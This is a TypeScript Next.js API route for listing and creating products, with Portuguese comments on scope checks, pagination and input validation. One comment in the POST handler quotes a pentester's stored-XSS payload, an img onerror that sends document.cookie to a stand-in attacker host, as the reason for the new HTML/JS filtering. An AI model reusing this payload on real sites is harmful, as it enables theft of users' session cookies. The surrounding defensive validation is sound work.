import { NextResponse } from "next/server";
import { z } from "zod";
import { withApiLog } from "@/lib/api-log";
import { prisma } from "@/lib/prisma";
import { authenticate, errorResponse, requireScope } from "@/lib/api-response";
import { uniqueSlug } from "@/lib/slugify";
import { validateSafeName, validateSafeText } from "@/lib/security/safe-input";

async function GET_handler(request: Request) {
  const { record, response } = await authenticate(request);
  if (!record) return response!;

  // Gate de escopo (09/08/2026). Permissivo pra chave com `scopes` vazio,
  // que e o caso de TODAS as chaves emitidas ate hoje — nada quebra pra
  // quem ja integra. So recusa quando a chave foi criada escolhendo
  // escopos e este nao esta entre eles. Ver lib/api-scopes.ts.
  const scopeDenied = requireScope(record, "products");
  if (scopeDenied) return scopeDenied;

  const url = new URL(request.url);
  const limit = Math.min(Number(url.searchParams.get("limit") ?? 20), 100);
  const cursor = url.searchParams.get("cursor") ?? undefined;

  const products = await prisma.product.findMany({
    where: {
      userId: record.userId,
      // Esconde o produto "ghost" interno (slug __api_default_*) — a doc manda
      // o seller pegar o product_id daqui pra UTMify, entao o ghost NAO pode
      // aparecer (senao ele copiaria o ID errado e cairia no mesmo problema).
      slug: { not: { startsWith: "__api_default_" } },
    },
    orderBy: { createdAt: "desc" },
    take: limit + 1,
    ...(cursor ? { cursor: { id: cursor }, skip: 1 } : {}),
  });

  const hasMore = products.length > limit;
  const data = hasMore ? products.slice(0, -1) : products;

  return NextResponse.json({
    data: data.map(serializeProduct),
    has_more: hasMore,
    next_cursor: hasMore ? data[data.length - 1]?.id : null,
  });
}

const CreateBody = z.object({
  name: z.string().trim().min(2).max(120),
  description: z.string().trim().max(2000).optional().nullable(),
  image: z.string().url().optional().nullable(),
  type: z.enum(["DIGITAL", "PHYSICAL", "SUBSCRIPTION", "SERVICE"]).default("DIGITAL"),
  price_cents: z.number().int().positive(),
  currency: z.string().length(3).default("BRL"),
  slug: z.string().trim().min(1).max(80).optional(),
  active: z.boolean().default(true),
  interval_days: z.number().int().positive().optional().nullable(),
});

async function POST_handler(request: Request) {
  const { record, response } = await authenticate(request);
  if (!record) return response!;

  // Gate de escopo (09/08/2026). Permissivo pra chave com `scopes` vazio,
  // que e o caso de TODAS as chaves emitidas ate hoje — nada quebra pra
  // quem ja integra. So recusa quando a chave foi criada escolhendo
  // escopos e este nao esta entre eles. Ver lib/api-scopes.ts.
  const scopeDenied = requireScope(record, "products");
  if (scopeDenied) return scopeDenied;

  let body: unknown;
  try {
    body = await request.json();
  } catch {
    return errorResponse(400, "invalid_json", "Request body must be valid JSON.");
  }

  const parsed = CreateBody.safeParse(body);
  if (!parsed.success) {
    return errorResponse(
      422,
      "validation_error",
      "Some fields are invalid.",
      parsed.error.flatten().fieldErrors,
    );
  }

  const d = parsed.data;

  // XSS defense: bloqueia HTML/JS em name + description ANTES de gravar.
  // Contexto (16/07/2026): pentester tinha plantado nome de produto com
  // `"><img src=x onerror=fetch(atacante.com?c=+document.cookie)>`. React
  // escapa em JSX, mas dado apareceria bruto em emails de notificação, PDFs
  // e CSVs de export — e viraria bomba-relógio se um dia usarmos rich HTML.
  const nameCheck = validateSafeName(d.name);
  if (!nameCheck.ok) {
    return errorResponse(422, "validation_error", nameCheck.reason, { name: [nameCheck.reason] });
  }
  if (d.description) {
    const descCheck = validateSafeText(d.description, { maxLen: 2000 });
    if (!descCheck.ok) {
      return errorResponse(
        422,
        "validation_error",
        descCheck.reason,
        { description: [descCheck.reason] },
      );
    }
  }

  const finalSlug = await uniqueSlug(d.slug && d.slug.length > 0 ? d.slug : d.name, async (s) =>
    prisma.product.findUnique({ where: { slug: s }, select: { id: true } }),
  );

  const created = await prisma.product.create({
    data: {
      userId: record.userId,
      name: d.name,
      description: d.description || null,
      image: d.image || null,
      type: d.type,
      priceCents: d.price_cents,
      currency: d.currency,
      slug: finalSlug,
      active: d.active,
      intervalDays: d.type === "SUBSCRIPTION" ? d.interval_days ?? 30 : null,
    },
  });

  return NextResponse.json(serializeProduct(created), { status: 201 });
}

function serializeProduct(p: {
  id: string;
  name: string;
  description: string | null;
  image: string | null;
  type: string;
  priceCents: number;
  currency: string;
  slug: string;
  active: boolean;
  intervalDays: number | null;
  createdAt: Date;
  updatedAt: Date;
}) {
  return {
    id: p.id,
    object: "product",
    name: p.name,
    description: p.description,
    image: p.image,
    type: p.type,
    price_cents: p.priceCents,
    currency: p.currency,
    slug: p.slug,
    active: p.active,
    interval_days: p.intervalDays,
    created_at: p.createdAt.toISOString(),
    updated_at: p.updatedAt.toISOString(),
  };
}

// 09/08/2026: log de requisicao (secao 13). O wrapper NAO bloqueia a
// resposta — a gravacao vai em after(). Ver lib/api-log.ts.
export const GET = withApiLog(GET_handler);

// 09/08/2026: log de requisicao (secao 13). O wrapper NAO bloqueia a
// resposta — a gravacao vai em after(). Ver lib/api-log.ts.
export const POST = withApiLog(POST_handler);
